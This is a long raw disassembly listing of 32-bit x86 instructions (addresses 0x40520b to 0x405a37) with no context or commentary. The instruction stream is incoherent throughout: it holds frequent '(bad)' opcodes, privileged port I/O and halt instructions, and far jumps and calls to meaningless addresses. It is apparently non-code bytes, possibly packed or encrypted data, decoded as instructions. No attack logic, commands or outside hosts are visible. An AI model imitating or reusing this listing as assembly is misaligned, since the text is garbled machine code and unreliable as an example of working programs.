  40520b:	in     eax,0x56
  40520d:	lods   al,BYTE PTR ds:[esi]
  40520e:	mov    ds:0x712ae029,eax
  405213:	std    
  405214:	stos   BYTE PTR es:[edi],al
  405215:	icebp  
  405216:	jecxz  0x4051e3
  405218:	mov    ch,BYTE PTR [ebx+0x414a3b80]
  40521e:	or     DWORD PTR [esp+ebx*2-0x19],esp
  405222:	retf   0xa768
  405225:	iret   
  405226:	inc    ebx
  405227:	mov    edx,0x23d8ccd8
  40522c:	aas    
  40522d:	jl     0x40528d
  40522f:	inc    ebx
  405230:	and    esi,edx
  405232:	sub    DWORD PTR [ecx-0x51],eax
  405235:	in     al,0x5
  405237:	adc    DWORD PTR [ebx],ebx
  405239:	jns    0x4051ed
  40523b:	dec    esp
  40523c:	xchg   edi,eax
  40523d:	mov    bh,0x23
  40523f:	imul   ebx,DWORD PTR [edx-0x361cf4b7],0x2
  405246:	push   esp
  405247:	retf   0x3c5f
  40524a:	gs cld 
  40524c:	jnp    0x405239
  40524e:	jbe    0x4051f3
  405250:	aas    
  405251:	test   BYTE PTR [edx+0x76d2ae2f],bh
  405257:	imul   ebp,DWORD PTR [eax],0xffffff9d
  40525a:	lods   eax,DWORD PTR ds:[esi]
  40525b:	stos   DWORD PTR es:[edi],eax
  40525c:	pusha  
  40525d:	jmp    0x1b6:0xa0a5d9dd
  405264:	mov    eax,ds:0x132271dc
  405269:	ret    
  40526a:	inc    edi
  40526b:	test   DWORD PTR [ebx+0x7a],esp
  40526e:	xor    al,0x5c
  405270:	push   ds
  405271:	push   ebp
  405272:	sbb    cl,0xea
  405275:	inc    eax
  405276:	xchg   ecx,eax
  405277:	enter  0x9ad0,0x5e
  40527b:	dec    ebx
  40527d:	loopne 0x4052ef
  40527f:	shl    DWORD PTR [ebx+edx*1-0x25],0x7b
  405284:	adc    al,0x1c
  405286:	call   0x579bfd53
  40528b:	xchg   DWORD PTR [edx-0xa462d23],eax
  405291:	jg     0x40527a
  405293:	add    ebx,DWORD PTR [ecx+0x24]
  405296:	mov    esi,0xb2b2d438
  40529b:	imul   ebp,DWORD PTR [ebx],0x15a70b84
  4052a1:	out    dx,al
  4052a2:	mov    cl,0x14
  4052a4:	aas    
  4052a5:	add    ebx,0x8e1f2833
  4052ab:	jns    0x4052c0
  4052ad:	sub    al,0x2e
  4052af:	push   esi
  4052b0:	dec    esi
  4052b1:	sbb    eax,0x76e1b937
  4052b6:	mov    WORD PTR [ebx],ds
  4052b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052b9:	mov    ecx,0xa7d49095
  4052be:	sub    BYTE PTR [ebp+eax*2+0x1e9ce40d],bl
  4052c5:	jb     0x405296
  4052c7:	loop   0x405332
  4052c9:	pusha  
  4052ca:	add    al,0x55
  4052cc:	addr16 das 
  4052ce:	out    dx,eax
  4052cf:	into   
  4052d0:	or     BYTE PTR [ebp-0x7836b76f],0x1c
  4052d7:	retf   0x906d
  4052da:	jns    0x405337
  4052dc:	in     eax,dx
  4052dd:	pop    ebx
  4052de:	mov    ch,0x27
  4052e0:	inc    ebp
  4052e1:	iret   
  4052e2:	int    0x12
  4052e4:	test   al,0xca
  4052e6:	and    al,dh
  4052e8:	adc    al,BYTE PTR [ebp+edx*4-0x68f74c49]
  4052ef:	cs call 0x26f1547
  4052f5:	test   al,0xd4
  4052f7:	pop    ecx
  4052f8:	jp     0x405319
  4052fa:	inc    edx
  4052fb:	lods   al,BYTE PTR ds:[esi]
  4052fc:	mov    ebp,0xba70fcab
  405301:	(bad)  
  405303:	ret    
  405304:	pop    es
  405305:	mov    eax,0x8f72fc2d
  40530a:	push   ecx
  40530b:	dec    ebp
  40530c:	adc    eax,0xd204e328
  405311:	jl     0x4052b8
  405313:	or     DWORD PTR [edi-0x57],edi
  405316:	rol    DWORD PTR [ebx-0x36fdef00],1
  40531c:	jmp    0x3186330d
  405321:	jae    0x405310
  405323:	jl     0x405313
  405325:	xor    dh,cl
  405327:	out    0xa,al
  405329:	sbb    BYTE PTR [edi],cl
  40532b:	jg     0x40537a
  40532d:	and    al,0x46
  40532f:	imul   ebx,DWORD PTR [ecx-0x75c86752],0xab08fd2f
  405339:	inc    esi
  40533a:	cmp    eax,0xcb17221c
  40533f:	rcl    esi,cl
  405341:	xchg   ebx,eax
  405342:	add    dl,BYTE PTR [eax+0x15]
  405345:	mov    dl,0x67
  405347:	xor    eax,0x4fec807
  40534c:	cmc    
  40534d:	aaa    
  40534e:	cmp    DWORD PTR [esi-0x78b233ee],ecx
  405354:	sub    eax,0x73f70eca
  405359:	in     al,0xc7
  40535b:	icebp  
  40535c:	call   0x8b1f7df3
  405361:	add    eax,DWORD PTR [edx-0x75c92435]
  405367:	adc    eax,0x26892c95
  40536c:	jo     0x405373
  40536e:	mov    ds:0x5cbad2b1,eax
  405373:	ret    0x8dc7
  405376:	dec    ebp
  405377:	imul   ecx,DWORD PTR [esi-0x8],0x33f4b3f3
  40537e:	mov    esp,0xee603aa2
  405383:	test   BYTE PTR [ebx+0x4e],cl
  405386:	sub    bh,BYTE PTR [ecx+0x7f495558]
  40538c:	fdivp  st(3),st
  40538e:	pop    edx
  40538f:	mov    dh,0xe8
  405391:	nop
  405392:	test   al,0x90
  405394:	imul   ch
  405396:	push   edx
  405397:	sbb    al,0xe7
  405399:	dec    esi
  40539a:	cwde   
  40539b:	cmp    BYTE PTR [edx],dh
  40539d:	xchg   esi,eax
  40539e:	add    dl,BYTE PTR [edx]
  4053a0:	retf   0x5fef
  4053a3:	push   esp
  4053a4:	das    
  4053a5:	stos   DWORD PTR es:[edi],eax
  4053a6:	fwait
  4053a7:	mov    esp,0x5a4b37e2
  4053ac:	pop    edi
  4053ad:	pop    esp
  4053ae:	ficom  DWORD PTR [ecx]
  4053b0:	fwait
  4053b1:	cmp    dh,BYTE PTR [ebx+0xe]
  4053b4:	or     DWORD PTR [ecx+0x17],0x629f2fce
  4053bb:	jmp    0x405402
  4053bd:	aam    0x69
  4053bf:	lock sub edx,edi
  4053c2:	dec    esi
  4053c3:	push   esi
  4053c4:	shl    BYTE PTR [eax-0x3d],cl
  4053c7:	lock scas eax,DWORD PTR es:[edi]
  4053c9:	cmp    cl,bh
  4053cb:	std    
  4053cc:	in     eax,dx
  4053cd:	(bad)  
  4053ce:	dec    esp
  4053cf:	push   eax
  4053d0:	adc    eax,0x82e246fe
  4053d5:	xchg   edi,eax
  4053d6:	out    0x7,eax
  4053d8:	repnz popf 
  4053da:	lock iret 
  4053dc:	test   al,0xc3
  4053de:	sar    DWORD PTR [edi],cl
  4053e0:	ret    0x98aa
  4053e3:	ficom  DWORD PTR [eax-0x64]
  4053e6:	mov    bl,0x79
  4053e8:	dec    esi
  4053e9:	add    DWORD PTR [ebx],esi
  4053eb:	and    bl,BYTE PTR [eax+ebx*2]
  4053ee:	cli    
  4053ef:	push   ebx
  4053f0:	xchg   edi,eax
  4053f1:	dec    esi
  4053f2:	mov    ebp,0x9e94de57
  4053f7:	(bad)  
  4053f8:	jge    0x40546a
  4053fa:	ins    BYTE PTR es:[edi],dx
  4053fb:	enter  0x1ef4,0xa3
  4053ff:	jmp    0xee6bdb50
  405404:	inc    edi
  405405:	in     al,0x17
  405407:	jmp    0x4053a3
  405409:	in     al,dx
  40540a:	and    eax,0xbe63a396
  40540f:	jo     0x405455
  405411:	ss xchg cl,bh
  405414:	add    edx,DWORD PTR [esi-0x80]
  405417:	popf   
  405418:	sbb    eax,0x3fbae9ad
  40541d:	das    
  40541e:	inc    ebx
  40541f:	in     al,dx
  405420:	mov    eax,0xdd995e58
  405425:	mov    dh,BYTE PTR [edi+0x6eef82f0]
  40542b:	push   0xd6d1bcd1
  405430:	aaa    
  405431:	xchg   edx,eax
  405432:	ss adc ch,ch
  405435:	ins    BYTE PTR es:[edi],dx
  405436:	lea    edx,[ebx-0x30868bda]
  40543c:	mov    ebx,DWORD PTR [ebx]
  40543e:	sbb    eax,0xa4a1d6cf
  405443:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405444:	inc    eax
  405445:	popf   
  405446:	inc    ebx
  405447:	inc    esp
  405448:	push   cs
  405449:	sub    eax,0xf9861a7f
  40544e:	adc    bl,BYTE PTR [ebp+0x3a]
  405451:	adc    BYTE PTR [ecx-0x385291c8],0x37
  405458:	enter  0x5ca,0x9c
  40545c:	lds    esi,FWORD PTR [ecx-0x2a]
  40545f:	xor    eax,0xf42b7c96
  405464:	add    edx,esp
  405466:	loopne 0x405437
  405468:	mov    ebx,0x7146f9e
  40546d:	test   edx,esp
  40546f:	popa   
  405470:	mov    edx,DWORD PTR [ebx+0x39]
  405473:	xor    eax,0x84eadf50
  405478:	sar    BYTE PTR [ebp+0x403bf876],1
  40547e:	jge    0x405425
  405480:	lods   al,BYTE PTR ds:[esi]
  405481:	(bad)  
  405482:	std    
  405483:	push   0x8af5974f
  405488:	pop    esp
  405489:	hlt    
  40548a:	out    0xa0,eax
  40548c:	lods   al,BYTE PTR ds:[esi]
  40548d:	xor    eax,0x73fdc1c7
  405492:	mov    ch,BYTE PTR [edx+0x13]
  405495:	mov    edx,0x1a7bd1a
  40549a:	jmp    0xf285a59a
  40549f:	mov    bh,0xf
  4054a1:	out    0x47,al
  4054a3:	cmc    
  4054a4:	sbb    ebx,ebx
  4054a6:	jns    0x4054f4
  4054a8:	jno    0x4054ba
  4054aa:	inc    DWORD PTR [edx+0x18]
  4054ad:	call   0x7311be80
  4054b2:	xchg   ebp,eax
  4054b3:	cmp    al,0x99
  4054b5:	das    
  4054b6:	push   ds
  4054b7:	stc    
  4054b8:	rol    ebx,1
  4054ba:	push   0x875ebf18
  4054bf:	retf   
  4054c0:	mov    bh,0xfc
  4054c2:	jbe    0x405492
  4054c4:	pop    eax
  4054c5:	mov    esi,0x60346540
  4054ca:	pop    ss
  4054cb:	xchg   BYTE PTR [edx-0x7],ch
  4054ce:	mov    al,0x10
  4054d0:	fs xchg edx,eax
  4054d2:	imul   BYTE PTR [ecx+ecx*1+0x63]
  4054d6:	addr16 pop ds
  4054d8:	clc    
  4054d9:	or     BYTE PTR ds:0x227beac4,dl
  4054df:	fwait
  4054e0:	lahf   
  4054e1:	inc    BYTE PTR es:[ebx+0x18]
  4054e5:	jle    0x405558
  4054e7:	mov    bl,0x78
  4054e9:	push   ebp
  4054ea:	loope  0x405555
  4054ec:	mov    ch,0x94
  4054ee:	ins    BYTE PTR es:[edi],dx
  4054ef:	pop    ss
  4054f0:	inc    DWORD PTR [edx]
  4054f2:	jl     0x405501
  4054f4:	pop    edi
  4054f5:	pop    ecx
  4054f6:	mov    esi,DWORD PTR gs:[edi+0x5aacd0e]
  4054fd:	adc    BYTE PTR [eax+esi*8+0x1d],cl
  405501:	das    
  405502:	fdiv   DWORD PTR [edx]
  405504:	lods   al,BYTE PTR ds:[esi]
  405505:	xchg   edx,eax
  405506:	call   0x59a0:0xacdeeb74
  40550d:	sub    esi,ebp
  40550f:	add    DWORD PTR [esi],eax
  405511:	jbe    0x4054a9
  405513:	scas   eax,DWORD PTR es:[edi]
  405514:	(bad)  
  405515:	xlat   BYTE PTR ds:[ebx]
  405516:	push   ss
  405517:	mov    al,ds:0x106f47dc
  40551c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40551d:	jo     0x405525
  40551f:	jecxz  0x4054fe
  405521:	xchg   edi,eax
  405522:	into   
  405523:	(bad)  
  405524:	int    0x97
  405526:	jp     0x4054b7
  405528:	sub    BYTE PTR [edi+0x16],cl
  40552b:	push   es
  40552c:	mov    eax,ds:0x6705b10a
  405531:	scas   al,BYTE PTR es:[edi]
  405532:	out    dx,eax
  405533:	ror    BYTE PTR [esp+ecx*4],cl
  405536:	mov    bh,0xef
  405538:	add    DWORD PTR [ecx+0x31b8fc9d],0x38
  40553f:	data16 and ah,BYTE PTR [ebx-0x55]
  405543:	mov    ebx,0x7c220d91
  405548:	dec    eax
  405549:	call   0xa94d9392
  40554e:	test   edi,eax
  405550:	xchg   ebx,eax
  405551:	jno    0x4054da
  405553:	lea    esp,[esi+edx*2+0x57]
  405557:	mov    bh,0xb5
  405559:	cmp    ecx,0x1
  40555c:	data16 and BYTE PTR ds:0x60c07362,ch
  405563:	test   al,0x78
  405565:	and    ah,BYTE PTR [ebx+0x3b1b5d1d]
  40556b:	and    ah,BYTE PTR [esi-0x4cacb7d6]
  405571:	sbb    ecx,DWORD PTR [esi+0x26]
  405574:	aam    0xaa
  405576:	ret    0xd9f7
  405579:	les    ecx,FWORD PTR [edi+0x7469c7b0]
  40557f:	test   al,0x3f
  405581:	mov    ebx,0x4ba65e5
  405586:	dec    ecx
  405587:	clc    
  405588:	call   0x5899547
  40558d:	sub    ebx,esi
  40558f:	or     ebp,esp
  405591:	jne    0x4055c2
  405593:	adc    eax,0x5eca7bba
  405598:	call   0xee2522dd
  40559d:	rcl    DWORD PTR [ebx],1
  40559f:	repz fdiv QWORD PTR [edx+edx*2]
  4055a3:	jle    0x4055e5
  4055a5:	sbb    al,0xf5
  4055a7:	jnp    0x40561e
  4055a9:	imul   edi,DWORD PTR [ebx-0x754e87f2],0xcdeb6d57
  4055b3:	inc    esi
  4055b4:	dec    esi
  4055b5:	cli    
  4055b6:	(bad)  
  4055b8:	ja     0x40554c
  4055ba:	or     eax,0x73c840ab
  4055bf:	jp     0x4055bd
  4055c1:	sbb    ah,BYTE PTR [ecx+0x2b]
  4055c4:	jmp    0xffa0:0x80dd785a
  4055cb:	xchg   edx,eax
  4055cc:	jmp    FWORD PTR es:[edx+0x37]
  4055d0:	shl    BYTE PTR [edi-0x3d4685e],cl
  4055d6:	sbb    DWORD PTR [edx-0x60],0x13
  4055da:	sbb    ah,BYTE PTR [ebp+0x13]
  4055dd:	jge    0x4055c3
  4055df:	rol    BYTE PTR [edi],0xd5
  4055e2:	mov    eax,ds:0x5c78fe88
  4055e7:	pop    esp
  4055e8:	cmp    ecx,ebp
  4055ea:	imul   BYTE PTR [eax+0x74]
  4055ed:	(bad)  
  4055ee:	cmp    bl,al
  4055f0:	sbb    BYTE PTR [ebp-0x78],dh
  4055f3:	mov    esi,DWORD PTR [eax+0x386efe7d]
  4055f9:	add    eax,0xacc42de8
  4055fe:	test   al,0xcb
  405600:	ds cmp al,0x9c
  405603:	or     ecx,DWORD PTR [eax+0x57]
  405606:	out    0xfa,al
  405608:	aas    
  405609:	in     eax,dx
  40560a:	jmp    DWORD PTR [ecx+0x4b]
  40560d:	xchg   edi,eax
  40560e:	mov    ebx,0x1484e877
  405613:	and    DWORD PTR [edx+0x6e331a7f],esi
  405619:	pop    ebp
  40561a:	push   cs
  40561b:	jp     0x4055b8
  40561d:	mov    ch,0x93
  40561f:	add    al,0xac
  405621:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405622:	push   esp
  405623:	mov    dx,ds
  405626:	xor    esp,DWORD PTR ds:0x26e7a0b6
  40562c:	imul   ebp,DWORD PTR [esi-0x4966350b],0xffffffa6
  405633:	je     0x405675
  405635:	push   ecx
  405636:	xchg   esp,eax
  405637:	or     ch,BYTE PTR [ebp+0x44]
  40563a:	jns    0x4055c7
  40563c:	add    DWORD PTR [edi+eiz*2-0x49],edx
  405640:	je     0x4055ca
  405642:	loope  0x40562b
  405644:	mov    eax,0xc16208c7
  405649:	xchg   DWORD PTR [ebx],esp
  40564b:	dec    edx
  40564c:	sbb    BYTE PTR [eax],0x10
  40564f:	mov    ss,WORD PTR fs:[esi+eax*1+0x3e47d4e1]
  405657:	scas   eax,DWORD PTR es:[edi]
  405658:	jne    0x4055e6
  40565a:	xor    eax,0xcb7a2d70
  40565f:	mov    dh,0xa3
  405661:	dec    ebp
  405662:	shl    BYTE PTR [esi+0x66f5ce50],0x28
  405669:	(bad)  
  40566a:	jle    0x4055f0
  40566c:	sbb    eax,0xa6309d98
  405671:	repz xchg esp,eax
  405673:	xchg   ebp,eax
  405674:	adc    cl,BYTE PTR [ebx]
  405676:	xchg   esi,eax
  405677:	jns    0x4056b2
  405679:	mov    ebp,0xd74ecb42
  40567e:	int3   
  40567f:	outs   dx,BYTE PTR ds:[esi]
  405680:	test   BYTE PTR [ebp+0x602078d8],0xa2
  405687:	sub    bl,BYTE PTR ss:[ecx-0x3b]
  40568b:	pop    ecx
  40568c:	nop
  40568d:	adc    eax,0x6c9e5468
  405692:	or     eax,0x807726f0
  405697:	adc    bh,bl
  405699:	mov    al,ds:0x1d1c5220
  40569e:	popf   
  40569f:	into   
  4056a0:	xlat   BYTE PTR ds:[ebx]
  4056a1:	push   eax
  4056a2:	dec    ebx
  4056a3:	inc    ebx
  4056a4:	pop    ss
  4056a5:	gs push 0x3d75fadc
  4056ab:	or     ecx,ebp
  4056ad:	or     BYTE PTR [edx],ch
  4056af:	aad    0xa7
  4056b1:	dec    esi
  4056b2:	xor    edx,DWORD PTR ds:0x7421ef60
  4056b8:	sbb    BYTE PTR [edx+eiz*4],ah
  4056bb:	push   edi
  4056bc:	test   al,0x1f
  4056be:	sbb    bh,ah
  4056c0:	or     al,0xde
  4056c2:	mov    WORD PTR [edx+0x5d],gs
  4056c5:	jmp    0x405744
  4056c7:	aas    
  4056c8:	jl     0x4056c6
  4056ca:	inc    edi
  4056cb:	clc    
  4056cc:	xor    al,cl
  4056ce:	std    
  4056cf:	aad    0xeb
  4056d1:	sub    DWORD PTR [eax-0x63],eax
  4056d4:	test   DWORD PTR [ebx-0x9],ebx
  4056d7:	iret   
  4056d8:	mov    eax,ds:0xb83bdce
  4056dd:	inc    ecx
  4056de:	rcl    cl,cl
  4056e0:	sbb    DWORD PTR [ebx-0x49952646],eax
  4056e6:	jle    0x405712
  4056e8:	mov    ebp,0x593b866e
  4056ed:	cmc    
  4056ee:	cmp    DWORD PTR [edi+0x26671cd5],esp
  4056f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056f5:	lods   eax,DWORD PTR ds:[esi]
  4056f6:	repz retf 
  4056f8:	adc    ebx,esp
  4056fa:	sub    DWORD PTR [ecx-0x5],0xffffffd5
  4056fe:	mov    esp,0xf716e04f
  405703:	aaa    
  405704:	lahf   
  405705:	push   ss
  405706:	int    0x95
  405708:	push   ecx
  405709:	in     eax,dx
  40570a:	push   esi
  40570b:	hlt    
  40570c:	dec    ebx
  40570d:	shl    BYTE PTR [edi+0x233e9fe9],1
  405713:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405714:	jmp    0x4056a3
  405716:	and    ecx,DWORD PTR [ecx-0x332b2f2b]
  40571c:	adc    bh,ah
  40571e:	push   esi
  40571f:	(bad)  
  405720:	cmc    
  405721:	inc    esi
  405722:	imul   edi,ebx,0x9c4ccdf3
  405728:	sub    BYTE PTR [ebp+0x3a],0x8c
  40572c:	sbb    DWORD PTR [eax+0x22086884],ebx
  405732:	sahf   
  405733:	mov    edx,0x5afc2c23
  405738:	mov    edi,0x4a12f0b5
  40573d:	sbb    ch,bl
  40573f:	pushf  
  405740:	dec    edx
  405741:	or     DWORD PTR [ebp-0xb],esp
  405744:	test   esi,edx
  405746:	mov    esi,0x9c827d0b
  40574b:	xor    eax,0x432a4e81
  405750:	push   0xbf8269de
  405755:	int    0xc2
  405757:	into   
  405758:	sub    DWORD PTR ds:0x3996edc5,0xd82ae122
  405762:	movq   QWORD PTR ds:0x1fbf,mm5
  405768:	retf   0x69ab
  40576b:	punpckhbw mm1,QWORD PTR [ebx+0x64]
  40576f:	stos   BYTE PTR es:[edi],al
  405770:	add    cl,BYTE PTR [edi+0x72]
  405773:	imul   esi,DWORD PTR [esp+eax*1-0x5c],0x2eead29d
  40577b:	sub    eax,0x94ea67f6
  405780:	scas   al,BYTE PTR es:[edi]
  405781:	pop    ebp
  405782:	fsub   st,st(1)
  405784:	xor    bh,al
  405786:	in     al,dx
  405787:	jno    0x4057e1
  405789:	xor    eax,0xbf51f2e
  40578e:	xor    BYTE PTR [eax],0x8a
  405791:	jg     0x4057c9
  405793:	inc    edx
  405794:	imul   esi,DWORD PTR [ebx+0x4813b4df],0xffffffc7
  40579b:	push   ecx
  40579c:	popf   
  40579d:	push   eax
  40579e:	lods   al,BYTE PTR ds:[esi]
  40579f:	mov    ecx,0xf1bad183
  4057a4:	ds pop esi
  4057a6:	shl    DWORD PTR [edi+0x78],cl
  4057a9:	mov    dl,0xee
  4057ab:	das    
  4057ac:	jae    0x405818
  4057ae:	adc    al,0x91
  4057b0:	fild   QWORD PTR [esi-0x10de4c26]
  4057b6:	jne    0x4057fc
  4057b8:	sub    cl,ch
  4057ba:	mov    eax,0x23924c22
  4057bf:	lds    ebx,FWORD PTR [edx]
  4057c1:	dec    esi
  4057c2:	outs   dx,BYTE PTR ds:[esi]
  4057c3:	mov    esp,0x32b9295f
  4057c8:	push   eax
  4057c9:	ja     0x4057be
  4057cb:	sbb    DWORD PTR [edi-0x6d],edx
  4057ce:	mov    esp,0x6164ab5c
  4057d3:	sbb    al,0xe2
  4057d5:	mov    DWORD PTR [ebx+0x2379f417],esp
  4057db:	push   esp
  4057dc:	ror    edx,cl
  4057de:	mov    ebx,0x4748bbf3
  4057e3:	js     0x4057bb
  4057e5:	push   0x1fd65e47
  4057ea:	xchg   esi,eax
  4057eb:	dec    ecx
  4057ec:	jb     0x4057b2
  4057ee:	jecxz  0x4057df
  4057f0:	mov    ah,0xee
  4057f2:	loope  0x405868
  4057f4:	mov    edx,0x4c2f0426
  4057f9:	or     eax,0xb5f5b227
  4057fe:	loope  0x4057b0
  405800:	mov    bh,0x31
  405802:	lock aaa 
  405804:	ja     0x4057f2
  405806:	xchg   BYTE PTR [eax-0x31],bl
  405809:	jns    0x4057d0
  40580b:	in     eax,dx
  40580c:	in     al,0x4
  40580e:	sub    cl,bh
  405810:	sbb    al,0x46
  405812:	or     DWORD PTR [ebp+0x69],ebx
  405815:	ror    WORD PTR [edi+ebx*4+0xa23d060],cl
  40581d:	cmc    
  40581e:	je     0x405851
  405820:	rol    BYTE PTR [ebp-0xb],cl
  405823:	lea    esi,[ebp-0x12b18710]
  405829:	call   0xcfdd:0x64a93c4
  405830:	iret   
  405831:	xchg   edi,eax
  405832:	jmp    DWORD PTR [ebp-0x3cc679e7]
  405838:	adc    BYTE PTR [esi+0xe9db19d],ah
  40583e:	out    dx,al
  40583f:	std    
  405840:	adc    dh,BYTE PTR [edi-0x42]
  405843:	in     al,0xf2
  405845:	mov    ah,0xfd
  405847:	push   edx
  405848:	or     DWORD PTR [ebx-0x787c620f],ebx
  40584e:	or     BYTE PTR [esi+0x3a],bh
  405851:	jp     0x4058c0
  405853:	push   edx
  405854:	jmp    0x4a6c:0x910541dd
  40585b:	and    esp,DWORD PTR [ebx+0x561aacd8]
  405861:	adc    eax,0xc921c1e8
  405866:	push   ds
  405867:	dec    ebp
  405868:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405869:	pop    edi
  40586a:	xchg   ebp,eax
  40586b:	test   al,0xd6
  40586d:	xchg   dl,bh
  40586f:	and    DWORD PTR [edx+0x4eccb23e],ebp
  405875:	fbstp  TBYTE PTR [edx+0x2808542c]
  40587b:	jb     0x4058ac
  40587d:	fcomp  DWORD PTR [ecx-0x75a43ea3]
  405883:	push   esi
  405884:	(bad)  
  405885:	cld    
  405886:	ss ret 
  405888:	sub    ebp,0xbc9b7c9a
  40588e:	add    eax,0xfc38c711
  405893:	mov    cl,0x9d
  405895:	push   ds
  405896:	popa   
  405897:	rol    dh,1
  405899:	push   ecx
  40589a:	pusha  
  40589b:	inc    edi
  40589c:	sbb    eax,0xa22bc479
  4058a1:	or     ch,ah
  4058a3:	in     al,0x7a
  4058a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058a6:	jno    0x40585f
  4058a8:	inc    ebx
  4058a9:	push   0x77
  4058ab:	imul   ebx,edi,0x41b77cb3
  4058b1:	jl     0x40591b
  4058b3:	cwde   
  4058b4:	(bad)  
  4058b5:	ds adc al,0x9
  4058b8:	(bad)  [ecx-0x87b93ff]
  4058be:	stos   DWORD PTR es:[edi],eax
  4058bf:	imul   edi,DWORD PTR [ebp+0x2d8d8ee1],0xffffffaf
  4058c6:	js     0x405902
  4058c8:	add    ah,BYTE PTR ds:0x76dc8481
  4058ce:	jbe    0x40594e
  4058d0:	stos   DWORD PTR es:[edi],eax
  4058d1:	xchg   esi,eax
  4058d2:	sub    DWORD PTR [edi-0x780da6cf],ecx
  4058d8:	jb     0x40593b
  4058da:	sub    dl,BYTE PTR [esi-0x2d634b9d]
  4058e0:	(bad)  
  4058e2:	fs pop ds
  4058e4:	and    DWORD PTR [ebx-0x7f8cddcd],esp
  4058ea:	pop    edx
  4058eb:	and    esp,DWORD PTR [eax]
  4058ed:	mov    ds:0xc398acc4,al
  4058f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058f3:	push   edx
  4058f4:	in     eax,0x55
  4058f6:	add    dh,BYTE PTR [ebx]
  4058f8:	clc    
  4058f9:	dec    ebx
  4058fa:	sub    DWORD PTR [ebx+edi*2+0x6efdd11b],eax
  405901:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405902:	mov    ecx,0xdd239f33
  405907:	sbb    al,0x74
  405909:	enter  0xf05a,0x88
  40590d:	in     eax,0x90
  40590f:	(bad)  
  405910:	int3   
  405911:	add    dl,BYTE PTR [ecx]
  405913:	das    
  405914:	sub    dl,dh
  405916:	(bad)  [ecx]
  405918:	arpl   WORD PTR [eax+0x3e],di
  40591b:	repz or eax,0xc2ab9916
  405921:	sub    DWORD PTR [ecx+0x3b],edx
  405924:	cmp    edi,DWORD PTR [eax]
  405926:	and    al,0xae
  405928:	iret   
  405929:	xor    al,0xb1
  40592b:	mov    esi,0xbbf22b5d
  405930:	cmp    al,0x87
  405932:	fmulp  st(5),st
  405934:	or     ecx,edx
  405936:	arpl   WORD PTR [ebp-0x19],bp
  405939:	stc    
  40593a:	dec    edi
  40593b:	dec    ecx
  40593c:	and    al,BYTE PTR [eax+0x7de9878a]
  405942:	mov    edx,DWORD PTR [ebp-0x78]
  405945:	xchg   edi,eax
  405946:	or     al,0x7a
  405948:	mov    ebx,0xb6ee4fc3
  40594d:	xchg   BYTE PTR [edx+0x7667b7d2],dl
  405953:	mov    ebp,0x563c3bd6
  405958:	arpl   WORD PTR [ecx],ax
  40595a:	xor    dl,dl
  40595c:	outs   dx,BYTE PTR ds:[esi]
  40595d:	push   ss
  40595e:	inc    ebx
  40595f:	inc    eax
  405960:	or     eax,0xb402911a
  405965:	xchg   edx,eax
  405966:	mov    bh,0x19
  405968:	mov    dh,0x9
  40596a:	cli    
  40596b:	loop   0x40596f
  40596d:	je     0x4059ab
  40596f:	in     eax,dx
  405970:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405971:	pop    esi
  405972:	addr16 xchg edx,eax
  405974:	jne    0x4059e2
  405976:	pop    esi
  405977:	ins    DWORD PTR es:[edi],dx
  405978:	sub    eax,0xb87cc4d
  40597d:	repnz and al,0x8c
  405980:	aaa    
  405981:	sbb    bh,dh
  405983:	mov    ecx,0xce7ad297
  405988:	cmp    DWORD PTR [ebx+esi*2],ecx
  40598b:	mov    esi,0xc3cbea00
  405990:	aam    0x24
  405992:	shl    eax,0x99
  405995:	mov    edi,0xad492531
  40599a:	fild   WORD PTR [edx-0x78776bca]
  4059a0:	push   0x54a1d87e
  4059a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059a6:	and    eax,0x5c8bc8ad
  4059ab:	inc    esp
  4059ac:	(bad)  [eax]
  4059ae:	add    BYTE PTR [ecx*8-0x51d2cdf7],bh
  4059b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059b6:	push   cs
  4059b7:	retf   
  4059b8:	sub    al,0x88
  4059ba:	out    dx,eax
  4059bb:	add    ch,ah
  4059bd:	push   ecx
  4059be:	sbb    BYTE PTR [eax],bh
  4059c0:	and    eax,0x6531d058
  4059c5:	inc    eax
  4059c6:	scas   al,BYTE PTR es:[edi]
  4059c7:	and    ebx,DWORD PTR es:[esi-0x73]
  4059cb:	hlt    
  4059cc:	pop    ebp
  4059cd:	mov    ds:0xa2586009,eax
  4059d2:	ror    BYTE PTR [edi],1
  4059d4:	mov    BYTE PTR [ebx+eiz*4+0x5c],bh
  4059d8:	js     0x405991
  4059da:	sbb    DWORD PTR [ecx],edx
  4059dc:	jb     0x4059bf
  4059de:	imul   DWORD PTR [ebx]
  4059e0:	and    al,0xe8
  4059e2:	ja     0x4059a9
  4059e4:	mov    ds:0xcce8a9fc,eax
  4059e9:	xchg   esi,eax
  4059ea:	or     dl,BYTE PTR [edx]
  4059ec:	mov    es,WORD PTR [ecx]
  4059ee:	out    0xf1,eax
  4059f0:	dec    ecx
  4059f1:	add    bh,bl
  4059f3:	ret    0xa1b0
  4059f6:	and    al,ah
  4059f8:	mov    dl,0x73
  4059fa:	in     al,dx
  4059fb:	sbb    eax,0x204c9a6f
  405a00:	mov    esp,0x1708c462
  405a05:	dec    eax
  405a06:	xor    eax,0xe905e20b
  405a0b:	sub    BYTE PTR [ecx],dh
  405a0d:	pop    esi
  405a0e:	pop    edi
  405a0f:	setg   BYTE PTR [edx-0x6e63e4e9]
  405a16:	jbe    0x405a16
  405a18:	icebp  
  405a19:	ins    DWORD PTR es:[edi],dx
  405a1a:	jmp    0x50e129fa
  405a1f:	ja     0x4059ba
  405a21:	mov    ah,cl
  405a23:	out    0x3e,al
  405a25:	cmp    BYTE PTR [edi+eax*1-0x3f3b0490],cl
  405a2c:	ja     0x405a2e
  405a2e:	enter  0xd51a,0x5f
  405a32:	fcmovnbe st,st(7)
  405a34:	leave  
  405a35:	sub    ecx,ebp
  405a37:	adc    eax,0x65fbd01
